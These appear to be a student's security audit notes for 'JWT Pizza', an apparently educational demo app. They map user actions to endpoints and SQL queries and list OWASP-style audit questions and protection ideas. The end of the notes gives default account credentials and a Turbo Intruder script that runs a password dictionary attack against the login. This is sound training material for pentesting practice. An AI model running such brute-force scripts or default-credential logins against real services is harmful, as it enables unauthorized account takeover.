# JWT Pizza security audit

## User activity notes

| User activity                                       | Frontend component | Backend endpoints | Database SQL |
| --------------------------------------------------- | ------------------ | ----------------- | ------------ |
| View home page                                      |      home.tsx      |       none        |     none     |
| Register new user<br/>(t@jwt.com, pw: test)         |    register.tsx    | [POST] /api/auth  | INSERT INTO user (name, email, password) VALUES (?, ?, ?) INSERT INTO userRole (userId, role, objectId) VALUES (?, ?, ?) |
| Login new user<br/>(t@jwt.com, pw: test)            |     login.tsx      | [POST] /api/auth  | SELECT * FROM user WHERE email=? SELECT * FROM userRole WHERE userId=? INSERT INTO auth (token, userId) VALUES (?, ?) |
| Order pizza                                         | menu.tsx, payment.tsx, delivery.tsx | [GET] /api/order/menu, [GET] /api/franchise, [POST] /api/order | SELECT userId FROM auth WHERE token=? SELECT * FROM menu SELECT id, name FROM franchise SELECT id, name FROM store WHERE franchiseId=? INSERT INTO dinerOrder (dinerId, franchiseId, storeId, date) VALUES (?, ?, ?, now()) INSERT INTO orderItem (orderId, menuId, description, price) VALUES (?, ?, ?, ?) |
| Verify pizza                                        |    delivery.tsx    |       none        |     none     |
| View profile page                                   | dinerDashboard.tsx | [GET] /api/order  | SELECT id, franchiseId, storeId, date FROM dinerOrder WHERE dinerId=? LIMIT ${offset},${config.db.listPerPage} SELECT id, menuId, description, price FROM orderItem WHERE orderId=? |
| View franchise<br/>(as diner)                       | franchise-dashboard.tsx | [GET] /api/franchise/:userId | SELECT userId FROM auth WHERE token=? SELECT objectId FROM userRole WHERE role='franchisee' AND userId=? |
| Logout                                              |     logout.tsx     | [DELETE] /api/auth | SELECT userId FROM auth WHERE token=? DELETE FROM auth WHERE token=? |
| View About page                                     |    about.tsx       |       none        |     none     |
| View History page                                   |   history.tsx      |       none        |     none     |
| Login as franchisee<br/>(f@jwt.com, pw: franchisee) |     login.tsx      | [PUT] /api/auth  | SELECT * FROM user WHERE email=? SELECT * FROM userRole WHERE userId=? INSERT INTO auth (token, userId) VALUES (?, ?) |
| View franchise<br/>(as franchisee)                  | franchise-dashboard.tsx | [GET] /api/franchise/:userId | SELECT userId FROM auth WHERE token=? SELECT objectId FROM userRole WHERE role='franchisee' AND userId=? SELECT id, name FROM franchise WHERE id in (${franchiseIds.join(',')}) SELECT u.id, u.name, u.email FROM userRole AS ur JOIN user AS u ON u.id=ur.userId WHERE ur.objectId=? AND ur.role='franchisee' SELECT s.id, s.name, COALESCE(SUM(oi.price), 0) AS totalRevenue FROM dinerOrder AS do JOIN orderItem AS oi ON do.id=oi.orderId RIGHT JOIN store AS s ON s.id=do.storeId WHERE s.franchiseId=? GROUP BY s.id |
| Create a store                                      |  createStore.tsx   | [POST] /api/franchise/:franchiseId/store | SELECT userId FROM auth WHERE token=? SELECT u.id, u.name, u.email FROM userRole AS ur JOIN user AS u ON u.id=ur.userId WHERE ur.objectId=? AND ur.role='franchisee' SELECT s.id, s.name, COALESCE(SUM(oi.price), 0) AS totalRevenue FROM dinerOrder AS do JOIN orderItem AS oi ON do.id=oi.orderId RIGHT JOIN store AS s ON s.id=do.storeId WHERE s.franchiseId=? GROUP BY s.id INSERT INTO store (franchiseId, name) VALUES (?, ?) |
| Close a store                                       |   closeStore.tsx   | [DELETE] /api/franchise/:franchiseId/store/:storeId | SELECT u.id, u.name, u.email FROM userRole AS ur JOIN user AS u ON u.id=ur.userId WHERE ur.objectId=? AND ur.role='franchisee' SELECT s.id, s.name, COALESCE(SUM(oi.price), 0) AS totalRevenue FROM dinerOrder AS do JOIN orderItem AS oi ON do.id=oi.orderId RIGHT JOIN store AS s ON s.id=do.storeId WHERE s.franchiseId=? GROUP BY s.id DELETE FROM store WHERE franchiseId=? AND id=? |
| Login as admin<br/>(a@jwt.com, pw: admin)           |     login.tsx      | [PUT] /api/auth  | SELECT * FROM user WHERE email=? SELECT * FROM userRole WHERE userId=? INSERT INTO auth (token, userId) VALUES (?, ?) |
| View Admin page                                     | adminDashboard.tsx | [GET] /api/franchise | SELECT id, name FROM franchise SELECT u.id, u.name, u.email FROM userRole AS ur JOIN user AS u ON u.id=ur.userId WHERE ur.objectId=? AND ur.role='franchisee' SELECT s.id, s.name, COALESCE(SUM(oi.price), 0) AS totalRevenue FROM dinerOrder AS do JOIN orderItem AS oi ON do.id=oi.orderId RIGHT JOIN store AS s ON s.id=do.storeId WHERE s.franchiseId=? GROUP BY s.id |
| Create a franchise for t@jwt.com                    | createFranchise.tsx | [POST] /api/franchise | SELECT id, name FROM user WHERE email=? INSERT INTO franchise (name) VALUES (?) INSERT INTO userRole (userId, role, objectId) VALUES (?, ?, ?) |
| Close the franchise for t@jwt.com                   | closeFranchise.tsx | [DELETE] /api/franchise/:franchiseId | DELETE FROM store WHERE franchiseId=? DELETE FROM userRole WHERE objectId=? DELETE FROM franchise WHERE id=? |

## Audit Guide


User Roles:
Diner, Franchisee, Admin

| Documented Public Endpoints |
| JWT Pizza Service | JWT Pizza |
|-------------------|-----------|

| Undocumented Public Endpoints |
| JWT Pizza Service | JWT Pizza |
|-------------------|-----------|

For JWT this includes the /api/docs endpoint and /docs view.

Software Used:
- Linux ARM
- JavaScript
- Express
- UUID.   

Services Used:
- AWS CloudFront
- ECS.      

How Deployed?
- Github Actions


## Audit Questions
Here is a list of questions you can ask to help you find vulnerabilities that would deprive the world of the joy of JWT pizzas.

| Name                                       | Vector                                                                       |
| ------------------------------------------ | ---------------------------------------------------------------------------- |
| Broken Access Control                      | Can I bypass security with a URL or discoverable parameter?                  |
| Cryptographic Failures                     | Can I access unencrypted data in transit or at rest?                         |
| Injection                                  | Can I overload input parameters to execute code in the services?             |
| Insecure Design                            | Is there a design flaw that I can exploit for a DOS attack?                  |
| Security Misconfiguration                  | Are there known default configurations that are still in place?              |
| Vulnerable and Outdated Components         | Does the application use components with known vulnerabilities?              |
| Identification and Authentication Failures | Is there an endpoint that doesn't have the proper authentication controls?   |
| Software and Data Integrity Failures       | Can I discover credentials or configuration by observing the CI/CD pipeline? |
| Software Logging and Monitoring Failures   | Can I overload or disable the metrics and logging to hide my tracks?         |
| Server side request forgery                | Can I execute a fetch or console command with the server execution rights?   |



## Protection ideas:
- Change all accounts to secure passwords
- Hash/Salt passwords
- Implement a login attempt limit




## Penetration Testing ideas:
- Check for default accounts, fuzz passwords
{"email":"a@jwt.com", "password":"admin"}
{"name":"pizza diner", "email":"d@jwt.com", "password":"diner"}
{"name":"pizza franchisee", "email":"f@jwt.com", "password":"franchisee"}

### Password Dictionary attack

Use Turbo intruder with this script, and specialLists script (see downloads)
```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    # Check all the words in the UNIX dictionary
    for word in open('C:\\Users\\taylo\\Downloads\\common_passwords.txt'):
        engine.queue(target.req, word.rstrip())

# Success for any 200 response
def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```
